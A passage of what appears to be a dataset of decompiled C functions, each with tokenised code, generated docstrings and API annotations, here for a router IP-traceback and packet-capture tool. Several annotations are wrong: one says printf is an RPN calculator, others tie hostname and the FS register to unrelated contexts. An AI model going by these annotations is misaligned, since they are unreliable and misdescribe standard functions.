            "loghdl",
            ")",
            ";",
            "exit",
            "(",
            "0",
            ")",
            ";",
            "}",
            "}",
            "}",
            "}",
            "else",
            "{",
            "v10",
            "=",
            "ip_0",
            "-",
            ">",
            "daddr",
            ";",
            "if",
            "(",
            "v10",
            "!",
            "=",
            "htonl",
            "(",
            "rinp",
            "-",
            ">",
            "victim_addr",
            ")",
            ")",
            "__assert_fail",
            "(",
            "\"ip->daddr == htonl(rinp->victim_addr)\"",
            ",",
            "\"router.c\"",
            ",",
            "0x139u",
            ",",
            "\"router_process_filtered_pkt\"",
            ")",
            ";",
            "payload_len",
            "=",
            "LOWORD",
            "(",
            "hdr",
            "-",
            ">",
            "len",
            ")",
            "-",
            "(",
            "(",
            "_WORD",
            ")",
            "payload",
            "-",
            "bytesa",
            ")",
            ";",
            "if",
            "(",
            "ip_0",
            "-",
            ">",
            "protocol",
            "=",
            "=",
            "17",
            "&",
            "&",
            "(",
            "v11",
            "=",
            "udp",
            "-",
            ">",
            "_anon_0",
            ".",
            "_anon_0",
            ".",
            "uh_dport",
            ",",
            "v11",
            "=",
            "=",
            "htons",
            "(",
            "rinp",
            "-",
            ">",
            "victim_port",
            ")",
            ")",
            ")",
            "{",
            "router_intercept_traceback_msg",
            "(",
            "payload",
            ",",
            "payload_len",
            ",",
            "rinp",
            "-",
            ">",
            "router_addr",
            ",",
            "rinp",
            "-",
            ">",
            "victim_addr",
            ",",
            "rinp",
            "-",
            ">",
            "victim_port",
            ")",
            ";",
            "}",
            "else",
            "if",
            "(",
            "(",
            "double",
            ")",
            "rand",
            "(",
            ")",
            "/",
            "2147483647",
            ".",
            "0",
            "<",
            "=",
            "input",
            ".",
            "probability",
            ")",
            "{",
            "buf",
            "[",
            "0",
            "]",
            "=",
            "-",
            "34",
            ";",
            "buf",
            "[",
            "1",
            "]",
            "=",
            "-",
            "83",
            ";",
            "buf",
            "[",
            "2",
            "]",
            "=",
            "-",
            "2",
            ";",
            "buf",
            "[",
            "3",
            "]",
            "=",
            "-",
            "19",
            ";",
            "buf",
            "[",
            "4",
            "]",
            "=",
            "1",
            ";",
            "buf",
            "[",
            "5",
            "]",
            "=",
            "2",
            ";",
            "buf",
            "[",
            "6",
            "]",
            "=",
            "ntohl",
            "(",
            "ip_0",
            "-",
            ">",
            "saddr",
            ")",
            ">",
            ">",
            "24",
            ";",
            "buf",
            "[",
            "7",
            "]",
            "=",
            "ntohl",
            "(",
            "ip_0",
            "-",
            ">",
            "saddr",
            ")",
            ">",
            ">",
            "16",
            ";",
            "buf",
            "[",
            "8",
            "]",
            "=",
            "(",
            "unsigned",
            "__int16",
            ")",
            "ntohl",
            "(",
            "ip_0",
            "-",
            ">",
            "saddr",
            ")",
            ">",
            ">",
            "8",
            ";",
            "buf",
            "[",
            "9",
            "]",
            "=",
            "ntohl",
            "(",
            "ip_0",
            "-",
            ">",
            "saddr",
            ")",
            ";",
            "buf",
            "[",
            "10",
            "]",
            "=",
            "HIBYTE",
            "(",
            "rinp",
            "-",
            ">",
            "router_addr",
            ")",
            ";",
            "buf",
            "[",
            "11",
            "]",
            "=",
            "BYTE2",
            "(",
            "rinp",
            "-",
            ">",
            "router_addr",
            ")",
            ";",
            "buf",
            "[",
            "12",
            "]",
            "=",
            "BYTE1",
            "(",
            "rinp",
            "-",
            ">",
            "router_addr",
            ")",
            ";",
            "buf",
            "[",
            "13",
            "]",
            "=",
            "rinp",
            "-",
            ">",
            "router_addr",
            ";",
            "router_send_traceback_message",
            "(",
            "rinp",
            "-",
            ">",
            "victim_addr",
            ",",
            "rinp",
            "-",
            ">",
            "victim_port",
            ",",
            "0",
            ",",
            "buf",
            ",",
            "0xEu",
            ",",
            "2u",
            ")",
            ";",
            "+",
            "+",
            "input",
            ".",
            "epoch_cnt",
            ";",
            "curr_time",
            "=",
            "(",
            "double",
            ")",
            "(",
            "int",
            ")",
            "hdr",
            "-",
            ">",
            "ts",
            ".",
            "tv_usec",
            "/",
            "1000000",
            ".",
            "0",
            "+",
            "(",
            "double",
            ")",
            "(",
            "int",
            ")",
            "hdr",
            "-",
            ">",
            "ts",
            ".",
            "tv_sec",
            ";",
            "if",
            "(",
            "first_6332",
            ")",
            "{",
            "first_6332",
            "=",
            "0",
            ";",
            "input",
            ".",
            "epoch_start",
            "=",
            "curr_time",
            ";",
            "}",
            "else",
            "if",
            "(",
            "curr_time",
            "-",
            "input",
            ".",
            "epoch_start",
            ">",
            "(",
            "double",
            ")",
            "(",
            "int",
            ")",
            "input",
            ".",
            "epoch",
            ")",
            "{",
            "addr",
            ".",
            "s_addr",
            "=",
            "htonl",
            "(",
            "rinp",
            "-",
            ">",
            "victim_addr",
            ")",
            ";",
            "num_epochs",
            "=",
            "(",
            "int",
            ")",
            "(",
            "(",
            "curr_time",
            "-",
            "input",
            ".",
            "epoch_start",
            ")",
            "/",
            "(",
            "double",
            ")",
            "(",
            "int",
            ")",
            "input",
            ".",
            "epoch",
            ")",
            ";",
            "for",
            "(",
            "idx",
            "=",
            "0",
            ";",
            "num_epochs",
            ">",
            "idx",
            ";",
            "+",
            "+",
            "idx",
            ")",
            "{",
            "v12",
            "=",
            "input",
            ".",
            "epoch_cnt",
            ";",
            "v13",
            "=",
            "inet_ntop",
            "(",
            "2",
            ",",
            "&",
            "addr",
            ",",
            "str",
            ",",
            "0x10u",
            ")",
            ";",
            "fprintf",
            "(",
            "input",
            ".",
            "loghdl",
            ",",
            "\"%.6f  %-15s  %u\\n\"",
            ",",
            "input",
            ".",
            "epoch_start",
            ",",
            "v13",
            ",",
            "v12",
            ")",
            ";",
            "input",
            ".",
            "epoch_start",
            "=",
            "(",
            "double",
            ")",
            "(",
            "int",
            ")",
            "input",
            ".",
            "epoch",
            "+",
            "input",
            ".",
            "epoch_start",
            ";",
            "input",
            ".",
            "epoch_cnt",
            "=",
            "0",
            ";",
            "}",
            "}",
            "}",
            "}",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code appears to be a function (`router_process_filtered_pkt`) responsible for processing packets, including verifying packet integrity, extracting packet data, and potentially intercepting or sending traceback messages based on certain conditions, with annotations possibly indicating areas of interest for further analysis or improvement."
    },
    {
        "id": 301,
        "docstring_tokens": [
            "The",
            "code",
            "captures",
            "packets",
            "from",
            "a",
            "live",
            "network",
            "interface",
            ",",
            "compiles",
            "a",
            "filter",
            ",",
            "sets",
            "the",
            "filter",
            ",",
            "and",
            "then",
            "continuously",
            "reads",
            "packets",
            "using",
            "the",
            "ReadPacket",
            "function",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            ")",
            "{",
            "pcap_if_t",
            "*",
            "interface_list",
            ";",
            "bpf_program",
            "fp",
            ";",
            "char",
            "errorbuffer",
            "[",
            "256",
            "]",
            ";",
            "bpf_u_int32",
            "netp",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "pcap_findalldevs",
            "(",
            "&",
            "interface_list",
            ",",
            "errorbuffer",
            ")",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "printf",
            "(",
            "\"pcap_findalldevs: %s\\n\"",
            ",",
            "errorbuffer",
            ")",
            ";",
            "exit",
            "(",
            "0",
            ")",
            ";",
            "}",
            "interfaceinfo",
            "=",
            "(",
            "pcap_t",
            "*",
            ")",
            "pcap_open_live",
            "(",
            "interface_list",
            "-",
            ">",
            "name",
            ",",
            "0x2000L",
            "L",
            ",",
            "1L",
            "L",
            ",",
            "0xFFFFFFFFL",
            "L",
            ",",
            "errorbuffer",
            ")",
            ";",
            "if",
            "(",
            "!",
            "interfaceinfo",
            ")",
            "{",
            "printf",
            "(",
            "\"pcap_open_live(): %s\\n\"",
            ",",
            "errorbuffer",
            ")",
            ";",
            "exit",
            "(",
            "0",
            ")",
            ";",
            "}",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "pcap_compile",
            "(",
            "interfaceinfo",
            ",",
            "&",
            "fp",
            ",",
            "\"tcp and (port 8506 || port 8507)\"",
            ",",
            "0L",
            "L",
            ",",
            "netp",
            ")",
            "=",
            "=",
            "-",
            "1",
            ")",
            "perror",
            "(",
            "\"pcap_comile\"",
            ")",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "pcap_setfilter",
            "(",
            "interfaceinfo",
            ",",
            "&",
            "fp",
            ")",
            "=",
            "=",
            "-",
            "1",
            ")",
            "perror",
            "(",
            "\"pcap_setfilter\"",
            ")",
            ";",
            "pcap_loop",
            "(",
            "interfaceinfo",
            ",",
            "0xFFFFFFFFL",
            "L",
            ",",
            "ReadPacket",
            ",",
            "0L",
            "L",
            ")",
            ";",
            "return",
            "0",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "Based on the provided code snippets and the function name \"pcap_findalldevs,\" it appears to be a function used in libpcap (packet capture library) for finding all available network devices/interfaces on a system.",
            "The `printf` function is a standard C function used for formatted output to the console, but in this specific context, it seems to be redefined and extended for a Reverse Polish Notation (RPN) calculator, where operators and operands are passed as arguments for mathematical evaluation.",
            "The function `cap_find` appears to search for a PCI capability of a specified type within a PCI header structure, returning the offset of the first capability with the specified type.",
            "The function `pcap_open` is likely intended to initialize and open a packet capture handle or file based on the provided path or device, incorporating header definitions and potentially utilizing a library like libpcap for capturing network packets or handling packet capture files.",
            "The function `pcap_compile` is used to compile a filter expression into a program that can be applied to packets, typically used in conjunction with packet capturing libraries like libpcap to filter network traffic based on specified criteria.",
            "The `perror` function is used to print an error message, typically describing the last error encountered during a system call or library function, along with a custom message provided as input, and is often used in error handling routines.",
            "The function `cap_setfilter` is likely used to set a packet filter for capturing network traffic in a packet capture library, such as libpcap, by compiling and applying a filter expression to limit captured packets to those matching specific criteria, as shown in the provided code snippets."
        ],
        "longer_label": "The provided code is a C function utilizing the libpcap library to capture network packets on specified ports, with error handling for device detection, filter compilation, and setting, aimed at packet capture functionality."
    },
    {
        "id": 302,
        "docstring_tokens": [
            "The",
            "code",
            "initializes",
            "a",
            "router",
            "packet",
            "scanning",
            "process",
            "using",
            "libpcap",
            "to",
            "capture",
            "packets",
            "based",
            "on",
            "a",
            "specified",
            "filter",
            "and",
            "process",
            "them",
            "using",
            "a",
            "callback",
            "function",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "uint32_t",
            "router_addr",
            ",",
            "uint32_t",
            "victim_addr",
            ",",
            "uint16_t",
            "victim_port",
            ")",
            "{",
            "const",
            "char",
            "*",
            "v3",
            ";",
            "in_addr",
            "addr",
            ";",
            "int",
            "ret",
            ";",
            "pcap_t",
            "*",
            "pcap_hdl",
            ";",
            "router_pcap_loop_t",
            "rinp",
            ";",
            "bpf_program",
            "fp",
            ";",
            "char",
            "buf",
            "[",
            "16",
            "]",
            ";",
            "char",
            "errbuf",
            "[",
            "256",
            "]",
            ";",
            "char",
            "filter",
            "[",
            "256",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v14",
            ";",
            "v14",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "memset",
            "(",
            "filter",
            ",",
            "0",
            ",",
            "sizeof",
            "(",
            "filter",
            ")",
            ")",
            ";",
            "if",
            "(",
            "!",
            "router_get_devname",
            "(",
            "router_addr",
            ")",
            ")",
            "exit",
            "(",
            "0",
            ")",
            ";",
            "pcap_hdl",
            "=",
            "(",
            "pcap_t",
            "*",
            ")",
            "pcap_open_live",
            "(",
            "\"any\"",
            ",",
            "256L",
            "L",
            ",",
            "0L",
            "L",
            ",",
            "0xFFFFFFFFL",
            "L",
            ",",
            "errbuf",
            ")",
            ";",
            "if",
            "(",
            "pcap_hdl",
            ")",
            "{",
            "ret",
            "=",
            "pcap_setdirection",
            "(",
            "pcap_hdl",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "ret",
            ")",
            "__assert_fail",
            "(",
            "\"ret == 0\"",
            ",",
            "\"router.c\"",
            ",",
            "0x1DCu",
            ",",
            "\"router_start_scanning_packets\"",
            ")",
            ";",
            "addr",
            ".",
            "s_addr",
            "=",
            "htonl",
            "(",
            "victim_addr",
            ")",
            ";",
            "v3",
            "=",
            "inet_ntop",
            "(",
            "2",
            ",",
            "&",
            "addr",
            ",",
            "buf",
            ",",
            "0x10u",
            ")",
            ";",
            "snprintf",
            "(",
            "filter",
            ",",
            "0x100uL",
            "L",
            ",",
            "\"ip host %s\"",
            ",",
            "v3",
            ")",
            ";",
            "ret",
            "=",
            "pcap_compile",
            "(",
            "pcap_hdl",
            ",",
            "&",
            "fp",
            ",",
            "filter",
            ",",
            "0L",
            "L",
            ",",
            "0L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "ret",
            ")",
            "__assert_fail",
            "(",
            "\"ret == 0\"",
            ",",
            "\"router.c\"",
            ",",
            "0x1E4u",
            ",",
            "\"router_start_scanning_packets\"",
            ")",
            ";",
            "ret",
            "=",
            "pcap_setfilter",
            "(",
            "pcap_hdl",
            ",",
            "&",
            "fp",
            ")",
            ";",
            "if",
            "(",
            "ret",
            ")",
            "__assert_fail",
            "(",
            "\"ret == 0\"",
            ",",
            "\"router.c\"",
            ",",
            "0x1E7u",
            ",",
            "\"router_start_scanning_packets\"",
            ")",
            ";",
            "rinp",
            ".",
            "victim_addr",
            "=",
            "victim_addr",
            ";",
            "rinp",
            ".",
            "victim_port",
            "=",
            "victim_port",
            ";",
            "rinp",
            ".",
            "router_addr",
            "=",
            "router_addr",
            ";",
            "pcap_loop",
            "(",
            "pcap_hdl",
            ",",
            "0xFFFFFFFFL",
            "L",
            ",",
            "router_process_filtered_pkt",
            ",",
            "&",
            "rinp",
            ")",
            ";",
            "}",
            "else",
            "{",
            "puts",
            "(",
            "errbuf",
            ")",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__readfsqword` is likely used to read a 64-bit unsigned integer from the FS segment register at a specified offset, providing low-level access to the FS segment in x86 or x64 architectures, often utilized for system-level programming or kernel development.",
            "The function `memset` is used to fill a block of memory with a particular value, often used for initializing or resetting memory regions to a specific byte pattern or zero.",
            "The function `ter_get_devnamerouter_addr` likely retrieves the address of a router associated with a given device name in a networking context.",
            "The function `htonl` is used to convert a 32-bit unsigned integer from host byte order to network byte order, where the most significant byte is placed at the lowest memory address, by rearranging the bytes appropriately.",
            "The `_compile` function likely serves as a central compilation point for various BPF-related operations, including validating, attaching, detaching, and parsing BPF rules, as well as enabling the kernel BPF JIT compiler and handling TCPDump-like filter compilation if supported, primarily used in network packet filtering and manipulation."
        ],
        "longer_label": "The given C function `router_start_scanning_packets` initializes packet capturing on a network interface, filters packets based on a victim's IP address, and then processes the filtered packets using a callback function, with low-level access to system registers for architecture-specific operations and memory initialization, likely intended for network scanning or monitoring purposes."
    },
    {
        "id": 303,
        "docstring_tokens": [
            "The",
            "code",
            "establishes",
            "a",
            "socket",
            "connection",
            "on",
            "a",
            "specified",
            "port",
            ",",
            "accepts",
            "incoming",
            "connections",
            ",",
            "reads",
            "messages",
            "from",
            "clients",
            ",",
            "logs",
            "control",
            "signals",
            "and",
            "client",
            "addresses",
            ",",
            "and",
            "initiates",
            "packet",
            "scanning",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "uint16_t",
            "port",
            ")",
            "{",
            "const",
            "char",
            "*",
            "v2",
            ";",
            "double",
            "v3",
            ";",
            "uint16_t",
            "udp_port",
            ";",
            "uint32_t",
            "v5",
            ";",
            "uint32_t",
            "v6",
            ";",
            "int",
            "yes",
            ";",
            "socklen_t",
            "len",
            ";",
            "int",
            "sockfd",
            ";",
            "int",
            "rc",
            ";",
            "int",
            "cli_sockfd",
            ";",
            "sockaddr_in",
            "lcladdr",
            ";",
            "sockaddr_in",
            "cliaddr",
            ";",
            "char",
            "str",
            "[",
            "16",
            "]",
            ";",
            "char",
            "msg",
            "[",
            "256",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v16",
            ";",
            "v16",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "yes",
            "=",
            "1",
            ";",
            "sockfd",
            "=",
            "socket",
            "(",
            "2",
            ",",
            "1",
            ",",
            "0",
            ")",
            ";",
            "if",
            "(",
            "sockfd",
            "<",
            "0",
            ")",
            "{",
            "perror",
            "(",
            "\"Error creating socket. Reason\"",
            ")",
            ";",
            "return",
            "sockfd",
            ";",
            "}",
            "rc",
            "=",
            "setsockopt",
            "(",
            "sockfd",
            ",",
            "1",
            ",",
            "2",
            ",",
            "&",
            "yes",
            ",",
            "4u",
            ")",
            ";",
            "if",
            "(",
            "rc",
            "<",
            "0",
            ")",
            "{",
            "perror",
            "(",
            "\"Error setting socket options. Reason\"",
            ")",
            ";",
            "return",
            "rc",
            ";",
            "}",
            "memset",
            "(",
            "&",
            "lcladdr",
            ",",
            "0",
            ",",
            "sizeof",
            "(",
            "lcladdr",
            ")",
            ")",
            ";",
            "lcladdr",
            ".",
            "sin_family",
            "=",
            "2",
            ";",
            "lcladdr",
            ".",
            "sin_port",
            "=",
            "htons",
            "(",
            "port",
            ")",
            ";",
            "lcladdr",
            ".",
            "sin_addr",
            ".",
            "s_addr",
            "=",
            "htonl",
            "(",
            "0",
            ")",
            ";",
            "rc",
            "=",
            "bind",
            "(",
            "sockfd",
            ",",
            "(",
            "const",
            "struct",
            "sockaddr",
            "*",
            ")",
            "&",
            "lcladdr",
            ",",
            "0x10u",
            ")",
            ";",
            "if",
            "(",
            "rc",
            "<",
            "0",
            ")",
            "{",
            "perror",
            "(",
            "\"Error binding addr-port. Reason\"",
            ")",
            ";",
            "return",
            "rc",
            ";",
            "}",
            "rc",
            "=",
            "listen",
            "(",
            "sockfd",
            ",",
            "10",
            ")",
            ";",
            "if",
            "(",
            "rc",
            "<",
            "0",
            ")",
            "{",
            "perror",
            "(",
            "\"Error setting backlog. Reason\"",
            ")",
            ";",
            "return",
            "rc",
            ";",
            "}",
            "len",
            "=",
            "16",
            ";",
            "cli_sockfd",
            "=",
            "accept",
            "(",
            "sockfd",
            ",",
            "(",
            "struct",
            "sockaddr",
            "*",
            ")",
            "&",
            "cliaddr",
            ",",
            "&",
            "len",
            ")",
            ";",
            "if",
            "(",
            "cli_sockfd",
            ">",
            "=",
            "0",
            ")",
            "{",
            "rc",
            "=",
            "read",
            "(",
            "cli_sockfd",
            ",",
            "msg",
            ",",
            "0x100uL",
            "L",
            ")",
            ";",
            "if",
            "(",
            "rc",
            "<",
            "0",
            ")",
            "{",
            "perror",
            "(",
            "\"Error reading from client socket. Reason\"",
            ")",
            ";",
            "return",
            "rc",
            ";",
            "}",
            "msg",
            "[",
            "rc",
            "]",
            "=",
            "0",
            ";",
            "len",
            "=",
            "16",
            ";",
            "rc",
            "=",
            "getsockname",
            "(",
            "cli_sockfd",
            ",",
            "(",
            "struct",
            "sockaddr",
            "*",
            ")",
            "&",
            "lcladdr",
            ",",
            "&",
            "len",
            ")",
            ";",
            "if",
            "(",
            "rc",
            "<",
            "0",
            ")",
            "{",
            "perror",
            "(",
            "\"Error fetching socket name. Reason\"",
            ")",
            ";",
            "return",
            "rc",
            ";",
            "}",
            "close",
            "(",
            "cli_sockfd",
            ")",
            ";",
            "}",
            "else",
            "{",
            "perror",
            "(",
            "\"Error accepting connection. Reason\"",
            ")",
            ";",
            "}",
            "v2",
            "=",
            "inet_ntop",
            "(",
            "2",
            ",",
            "&",
            "cliaddr",
            ".",
            "sin_addr",
            ",",
            "str",
            ",",
            "0x10u",
            ")",
            ";",
            "v3",
            "=",
            "_time",
            "(",
            ")",
            ";",
            "fprintf",
            "(",
            "input",
            ".",
            "loghdl",
            ",",
            "\"%.6f  gotMarking  %s %s\\n\"",
            ",",
            "v3",
            ",",
            "v2",
            ",",
            "msg",
            ")",
            ";",
            "lcladdr",
            ".",
            "sin_port",
            "=",
            "ntohs",
            "(",
            "0",
            ")",
            ";",
            "input",
            ".",
            "local_addr",
            "=",
            "ntohl",
            "(",
            "lcladdr",
            ".",
            "sin_addr",
            ".",
            "s_addr",
            ")",
            ";",
            "rc",
            "=",
            "bind",
            "(",
            "trback_sockfd",
            ",",
            "(",
            "const",
            "struct",
            "sockaddr",
            "*",
            ")",
            "&",
            "lcladdr",
            ",",
            "0x10u",
            ")",
            ";",
            "if",
            "(",
            "rc",
            ">",
            "=",
            "0",
            ")",
            "{",
            "udp_port",
            "=",
            "input",
            ".",
            "udp_port",
            ";",
            "v5",
            "=",
            "ntohl",
            "(",
            "cliaddr",
            ".",
            "sin_addr",
            ".",
            "s_addr",
            ")",
            ";",
            "v6",
            "=",
            "ntohl",
            "(",
            "lcladdr",
            ".",
            "sin_addr",
            ".",
            "s_addr",
            ")",
            ";",
            "router_start_scanning_packets",
            "(",
            "v6",
            ",",
            "v5",
            ",",
            "udp_port",
            ")",
            ";",
            "return",
            "0",
            ";",
            "}",
            "else",
            "{",
            "perror",
            "(",
            "\"Error binding traceback socket. Reason\"",
            ")",
            ";",
            "return",
            "rc",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__readfsq` is likely used to read a 64-bit value from the FS segment register in x86-64 assembly, commonly employed for accessing thread-local storage or other system-specific data structures.",
            "The `memset` function is being defined and utilized for memory initialization and setting blocks of memory to a specific value, likely zero, with implementations that include standard C library functions like `memset`, `__builtin_memset`, or custom implementations from the runtime library."
        ],
        "longer_label": "The provided C function `router_wait_for_notifications` initializes a socket, listens for incoming connections, reads data from clients, logs received data along with client information, and binds a traceback socket for further processing, utilizing socket operations, error handling, and standard library functions."
    },
    {
        "id": 304,
        "docstring_tokens": [
            "This",
            "code",
            "creates",
            "a",
            "log",
            "file",
            "for",
            "a",
            "router",
            "with",
            "the",
            "hostname",
            "as",
            "part",
            "of",
            "the",
            "filename",
            "and",
            "opens",
            "it",
            "for",
            "writing",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "router_input_t",
            "*",
            "input",
            ")",
            "{",
            "char",
            "hostname",
            "[",
            "256",
            "]",
            ";",
            "char",
            "filename",
            "[",
            "272",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v3",
            ";",
            "v3",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "if",
            "(",
            "gethostname",
            "(",
            "hostname",
            ",",
            "0x100uL",
            "L",
            ")",
            ")",
            "__assert_fail",
            "(",
            "\"ret == 0\"",
            ",",
            "\"router.c\"",
            ",",
            "0x26Bu",
            ",",
            "\"router_create_logfile\"",
            ")",
            ";",
            "snprintf",
            "(",
            "filename",
            ",",
            "0x110uL",
            "L",
            ",",
            "\"%s.router.log\"",
            ",",
            "hostname",
            ")",
            ";",
            "input",
            "-",
            ">",
            "loghdl",
            "=",
            "fopen",
            "(",
            "filename",
            ",",
            "\"w+\"",
            ")",
            ";",
            "if",
            "(",
            "!",
            "input",
            "-",
            ">",
            "loghdl",
            ")",
            "{",
            "perror",
            "(",
            "\"Error creating output file. Reason\"",
            ")",
            ";",
            "exit",
            "(",
            "0",
            ")",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__readfsqword` is likely used to read a 64-bit quadword from the segment pointed to by the FS register, commonly utilized in low-level system programming for accessing thread-local storage or other kernel-related structures.",
            "The `hostname` function likely serves to resolve a given hostname or IP address to obtain the necessary connection parameters for setting up connections, possibly within a networking or cryptographic context, as indicated by the referenced code snippets dealing with DNS resolution, cryptographic operations, and network communication.",
            "The function `snprintf` is used for formatting a string into a specified buffer with a maximum size, preventing buffer overflow, as demonstrated in the provided code snippets where it constructs file paths without exceeding the buffer size."
        ],
        "longer_label": "The provided code is a function `router_create_logfile` that creates a logfile named after the hostname, potentially used in a networking or cryptographic context, by resolving the hostname using `gethostname`, formatting the filename using `snprintf`, and then creating the logfile with write and read permissions, handling errors accordingly."
    },
    {
        "id": 305,
        "docstring_tokens": [
            "The",
            "function",
            "sets",
            "up",
            "a",
            "traceback",
            "socket",
            "with",
            "a",
            "default",
            "TTL",
            "value",
            ",",
            "creates",
            "a",
            "socket",
            "using",
            "AF_INET",
            "and",
            "SOCK_DGRAM",
            ",",
            "sets",
            "the",
            "TTL",
            "option",
            "for",
            "the",
            "socket",
            ",",
            "and",
            "handles",
            "errors",
            "with",
            "appropriate",
            "error",
            "messages",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            ")",
            "{",
            "int",
            "ttl",
            ";",
            "int",
            "rc",
            ";",
            "unsigned",
            "__int64",
            "v2",
            ";",
            "v2",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "ttl",
            "=",
            "64",
            ";",
            "trback_sockfd",
            "=",
            "socket",
            "(",
            "2",
            ",",
            "2",
            ",",
            "0",
            ")",
            ";",
            "if",
            "(",
            "trback_sockfd",
            "<",
            "0",
            ")",
            "{",
            "perror",
            "(",
            "\"Error creating socket. Reason\"",
            ")",
            ";",
            "exit",
            "(",
            "trback_sockfd",
            ")",
            ";",
            "}",
            "rc",
            "=",
            "setsockopt",
            "(",
            "trback_sockfd",
            ",",
            "0",
            ",",
            "2",
            ",",
            "&",
            "ttl",
            ",",
            "4u",
            ")",
            ";",
            "if",
            "(",
            "rc",
            "<",
            "0",
            ")",
            "{",
            "perror",
            "(",
            "\"Error setting socket option. Reason\"",
            ")",
            ";",
            "exit",
            "(",
            "rc",
            ")",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `__readfsqword` function is likely used to read a quad-word (64-bit) value from a specific offset within the FS segment register, primarily in low-level programming for tasks like accessing thread-local storage or system structures on Windows platforms."
        ],
        "longer_label": "The provided code initializes a socket for traceback setup, sets its Time-to-Live (TTL) value to 64, and utilizes the `__readfsqword` function to read a 64-bit value from a specific offset within the FS segment register, commonly used for low-level tasks like accessing thread-local storage or system structures on Windows platforms."
    },
    {
        "id": 306,
        "docstring_tokens": [
            "The",
            "main",
            "function",
            "initializes",
            "input",
            ",",
            "reads",
            "input",
            "from",
            "arguments",
            ",",
            "creates",
            "a",
            "logfile",
            ",",
            "sets",
            "up",
            "a",
            "traceback",
            "socket",
            ",",
            "waits",
            "for",
            "notifications",
            "on",
            "a",
            "TCP",
            "port",
            ",",
            "flushes",
            "and",
            "closes",
            "the",
            "logfile",
            ",",
            "closes",
            "the",
            "traceback",
            "socket",
            ",",
            "and",
            "returns",
            "0",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "int",
            "argc",
            ",",
            "const",
            "char",
            "*",
            "*",
            "argv",
            ",",
            "const",
            "char",
            "*",
            "*",
            "envp",
            ")",
            "{",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "&",
            "input",
            ".",
            "epoch",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "&",
            "input",
            ".",
            "probability",
            "=",
            "0L",
            "L",
            ";",
            "input",
            ".",
            "loghdl",
            "=",
            "0L",
            "L",
            ";",
            "input",
            ".",
            "epoch_start",
            "=",
            "0",
            ".",
            "0",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "&",
            "input",
            ".",
            "epoch_cnt",
            "=",
            "0L",
            "L",
            ";",
            "router_read_input",
            "(",
            "&",
            "input",
            ",",
            "(",
            "char",
            "*",
            "*",
            ")",
            "argv",
            ",",
            "argc",
            ")",
            ";",
            "router_create_logfile",
            "(",
            "&",
            "input",
            ")",
            ";",
            "router_setup_traceback_socket",
            "(",
            ")",
            ";",
            "router_wait_for_notifications",
            "(",
            "input",
            ".",
            "tcp_port",
            ")",
            ";",
            "fflush",
            "(",
            "input",
            ".",
            "loghdl",
            ")",
            ";",
            "fclose",
            "(",
            "input",
            ".",
            "loghdl",
            ")",
            ";",
            "close",
            "(",
            "trback_sockfd",
            ")",
            ";",
            "return",
            "0",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The \"router\" function appears to be a part of a web server application, responsible for routing incoming HTTP requests to their respective handler functions based on matching routes, likely implemented within the \"router_match\" function.",
            "The \"create\" function likely initializes a data structure or system component, potentially related to task management, stack manipulation, or network node configuration, as indicated by the code snippets provided, including function declarations, static function definitions, and system programming references.",
            "The \"setup_traceback_socket\" function is likely intended to establish a socket connection for receiving and logging traceback information from remote sources within a software application.",
            "The function `close` appears to be a part of a larger codebase, including various system calls and utility functions, and it's used to close file descriptors after operations such as file mapping (`mmap`) or file I/O (`read`, `write`)."
        ],
        "longer_label": "The given code snippet defines a main function in a C program that initializes various variables, reads input from command-line arguments, creates a log file, sets up a socket for traceback information, waits for notifications on a TCP port, and performs cleanup before exiting."
    },
    {
        "id": 307,
        "docstring_tokens": [
            "This",
            "code",
            "defines",
            "a",
            "function",
            "that",
            "prints",
            "usage",
            "instructions",
            "for",
            "a",
            "program",
            "called",
            "traffana",
            ",",
            "including",
            "options",
            "and",
            "their",
            "corresponding",
            "help",
            "messages",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "char",
            "*",
            "progname",
            ")",
            "{",
            "int",
            "i",
            ";",
            "i",
            "=",
            "0",
            ";",
            "puts",
            "(",
            "\"\\nUsage:\\n traffana [-r | -i] OPTIONS\\n\"",
            ")",
            ";",
            "while",
            "(",
